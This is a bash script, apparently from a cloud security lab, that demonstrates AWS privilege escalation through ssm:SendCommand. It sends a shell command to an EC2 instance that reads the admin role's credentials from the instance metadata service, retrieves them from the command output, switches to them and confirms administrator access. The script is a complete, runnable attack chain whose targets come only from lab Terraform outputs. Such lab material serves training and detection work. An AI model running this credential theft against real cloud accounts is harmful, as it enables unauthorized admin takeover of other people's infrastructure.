#!/bin/bash

# Demo script for ssm:SendCommand privilege escalation
# This scenario demonstrates how a user with ssm:SendCommand can execute commands
# on EC2 instances with privileged roles to extract credentials and gain admin access


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-ssm-002-to-admin-starting-user"
EC2_ADMIN_ROLE="pl-prod-ssm-002-to-admin-ec2-admin-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}SSM SendCommand Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_ssm_002_ssm_sendcommand.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
INSTANCE_ID=$(echo "$MODULE_OUTPUT" | jq -r '.ec2_instance_id')
EC2_ROLE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.ec2_admin_role_name')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

if [ "$INSTANCE_ID" == "null" ] || [ -z "$INSTANCE_ID" ]; then
    echo -e "${RED}Error: Could not extract instance ID from terraform output${NC}"
    echo "The EC2 instance may not be ready yet. Wait a few minutes and try again."
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo "Target Instance: $INSTANCE_ID"
echo "Target Role: $EC2_ROLE_NAME"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# [EXPLOIT] Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [OBSERVATION] Step 5: Discover target EC2 instance
echo -e "${YELLOW}Step 5: Discovering target EC2 instance${NC}"
use_readonly_creds
echo "Listing EC2 instances with their attached IAM roles..."
INSTANCE_INFO=$(aws ec2 describe-instances \
    --region $AWS_REGION \
    --instance-ids $INSTANCE_ID \
    --query 'Reservations[0].Instances[0].[InstanceId,State.Name,IamInstanceProfile.Arn]' \
    --output text 2>/dev/null || echo "")

if [ -n "$INSTANCE_INFO" ]; then
    show_cmd "ReadOnly" "aws ec2 describe-instances --region $AWS_REGION --instance-ids $INSTANCE_ID --query 'Reservations[0].Instances[0].[InstanceId,State.Name,IamInstanceProfile.Arn]' --output text"
    echo "Instance ID: $(echo $INSTANCE_INFO | awk '{print $1}')"
    echo "State: $(echo $INSTANCE_INFO | awk '{print $2}')"
    echo "Instance Profile: $(echo $INSTANCE_INFO | awk '{print $3}')"
    echo -e "${GREEN}✓ Found target instance with privileged role${NC}"
else
    echo -e "${YELLOW}⚠ Could not describe instance${NC}"
    echo "Proceeding with instance ID from Terraform: $INSTANCE_ID"
fi
echo ""

# [OBSERVATION] Step 6: Check SSM agent status
echo -e "${YELLOW}Step 6: Checking if instance is ready for SSM commands${NC}"
use_readonly_creds
echo "Verifying SSM agent is running on the instance..."

MAX_RETRIES=5
RETRY_COUNT=0
SSM_READY=false

while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
    show_cmd "ReadOnly" "aws ssm describe-instance-information --region $AWS_REGION --filters \"Key=InstanceIds,Values=$INSTANCE_ID\" --query 'InstanceInformationList[0].PingStatus' --output text"
    SSM_STATUS=$(aws ssm describe-instance-information \
        --region $AWS_REGION \
        --filters "Key=InstanceIds,Values=$INSTANCE_ID" \
        --query 'InstanceInformationList[0].PingStatus' \
        --output text 2>/dev/null || echo "")

    if [ "$SSM_STATUS" = "Online" ]; then
        echo -e "${GREEN}✓ SSM agent is online and ready${NC}"
        SSM_READY=true
        break
    else
        RETRY_COUNT=$((RETRY_COUNT + 1))
        if [ $RETRY_COUNT -lt $MAX_RETRIES ]; then
            echo "SSM agent not ready yet (attempt $RETRY_COUNT/$MAX_RETRIES), waiting 10 seconds..."
            sleep 10
        fi
    fi
done

if [ "$SSM_READY" = false ]; then
    echo -e "${RED}Error: SSM agent is not ready on instance $INSTANCE_ID${NC}"
    echo "The instance may still be initializing. Please wait a few minutes and try again."
    exit 1
fi
echo ""

# [EXPLOIT] Step 7: Send SSM command to extract instance role credentials
echo -e "${YELLOW}Step 7: Sending SSM command to extract instance role credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "This is the privilege escalation vector..."
echo "Executing command to retrieve credentials from instance metadata service"

show_attack_cmd "Attacker" "aws ssm send-command --region $AWS_REGION --instance-ids \"$INSTANCE_ID\" --document-name \"AWS-RunShellScript\" --parameters 'commands=[\"TOKEN=\$(curl -X PUT \\\"http://169.254.169.254/latest/api/token\\\" -H \\\"X-aws-ec2-metadata-token-ttl-seconds: 21600\\\" 2>/dev/null)\",\"curl -H \\\"X-aws-ec2-metadata-token: \$TOKEN\\\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$EC2_ROLE_NAME 2>/dev/null\"]'"
COMMAND_ID=$(aws ssm send-command \
    --region $AWS_REGION \
    --instance-ids "$INSTANCE_ID" \
    --document-name "AWS-RunShellScript" \
    --parameters 'commands=["TOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" 2>/dev/null)","curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/'"$EC2_ROLE_NAME"' 2>/dev/null"]' \
    --query 'Command.CommandId' \
    --output text)

if [ -z "$COMMAND_ID" ] || [ "$COMMAND_ID" = "None" ]; then
    echo -e "${RED}Error: Failed to send SSM command${NC}"
    exit 1
fi

echo "Command ID: $COMMAND_ID"
echo -e "${GREEN}✓ SSM command sent successfully${NC}\n"

# [OBSERVATION] Step 8: Wait for command completion
echo -e "${YELLOW}Step 8: Waiting for command to complete${NC}"
use_readonly_creds
echo "This may take 15-30 seconds..."

sleep 15

# Check command status
MAX_WAIT=60
WAIT_TIME=0
COMMAND_COMPLETE=false

while [ $WAIT_TIME -lt $MAX_WAIT ]; do
    show_cmd "ReadOnly" "aws ssm list-commands --region $AWS_REGION --command-id \"$COMMAND_ID\" --query 'Commands[0].Status' --output text"
    COMMAND_STATUS=$(aws ssm list-commands \
        --region $AWS_REGION \
        --command-id "$COMMAND_ID" \
        --query 'Commands[0].Status' \
        --output text 2>/dev/null || echo "")

    if [ "$COMMAND_STATUS" = "Success" ]; then
        echo -e "${GREEN}✓ Command completed successfully${NC}"
        COMMAND_COMPLETE=true
        break
    elif [ "$COMMAND_STATUS" = "Failed" ] || [ "$COMMAND_STATUS" = "Cancelled" ]; then
        echo -e "${RED}Error: Command failed with status: $COMMAND_STATUS${NC}"
        exit 1
    fi

    echo -n "."
    sleep 5
    WAIT_TIME=$((WAIT_TIME + 5))
done

echo ""

if [ "$COMMAND_COMPLETE" = false ]; then
    echo -e "${RED}Error: Command did not complete within timeout${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 9: Retrieve command output containing credentials
echo -e "${YELLOW}Step 9: Retrieving command output with extracted credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

show_attack_cmd "Attacker" "aws ssm list-command-invocations --region $AWS_REGION --command-id \"$COMMAND_ID\" --details --query 'CommandInvocations[0].CommandPlugins[0].Output' --output text"
CREDS_JSON=$(aws ssm list-command-invocations \
    --region $AWS_REGION \
    --command-id "$COMMAND_ID" \
    --details \
    --query 'CommandInvocations[0].CommandPlugins[0].Output' \
    --output text)

if [ -z "$CREDS_JSON" ]; then
    echo -e "${RED}Error: Could not retrieve command output${NC}"
    exit 1
fi

echo "Retrieved credentials from instance metadata service"
echo -e "${GREEN}✓ Successfully extracted instance role credentials${NC}\n"

# [EXPLOIT] Step 10: Parse and export extracted credentials
echo -e "${YELLOW}Step 10: Parsing and configuring extracted credentials${NC}"

EXTRACTED_ACCESS_KEY=$(echo "$CREDS_JSON" | jq -r '.AccessKeyId')
EXTRACTED_SECRET_KEY=$(echo "$CREDS_JSON" | jq -r '.SecretAccessKey')
EXTRACTED_SESSION_TOKEN=$(echo "$CREDS_JSON" | jq -r '.Token')

if [ -z "$EXTRACTED_ACCESS_KEY" ] || [ "$EXTRACTED_ACCESS_KEY" = "null" ]; then
    echo -e "${RED}Error: Failed to parse credentials from command output${NC}"
    exit 1
fi

echo "Extracted Access Key ID: ${EXTRACTED_ACCESS_KEY:0:10}..."
echo "Switching to extracted credentials..."

# These are the dynamically stolen instance role credentials - not replaced by helper
export AWS_ACCESS_KEY_ID="$EXTRACTED_ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$EXTRACTED_SECRET_KEY"
export AWS_SESSION_TOKEN="$EXTRACTED_SESSION_TOKEN"
export AWS_REGION=$AWS_REGION

# Verify new identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
NEW_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $NEW_IDENTITY"
echo -e "${GREEN}✓ Now using extracted EC2 instance role credentials${NC}\n"

# [EXPLOIT] Step 11: Verify admin access
echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."

show_attack_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with ssm:SendCommand permission)"
echo "2. Sent SSM command to EC2 instance: $INSTANCE_ID"
echo "3. Extracted instance role credentials from metadata service"
echo "4. Used credentials from: $EC2_ADMIN_ROLE"
echo "5. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (ssm:SendCommand) → EC2 Instance"
echo -e "  → (Extract Credentials) → $EC2_ADMIN_ROLE → Admin"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- SSM Command: $COMMAND_ID"
echo "- Executed on instance: $INSTANCE_ID"
echo "- Extracted role: $EC2_ADMIN_ROLE"

echo -e "\n${BLUE}MITRE ATT&CK Techniques:${NC}"
echo "- T1651: Cloud Administration Command (SSM SendCommand)"
echo "- T1552.005: Unsecured Credentials: Cloud Instance Metadata API"

echo -e "\n${YELLOW}Note: SSM command history is automatically cleaned up by AWS after 30 days${NC}"
echo -e "${YELLOW}To clean up immediately (optional):${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
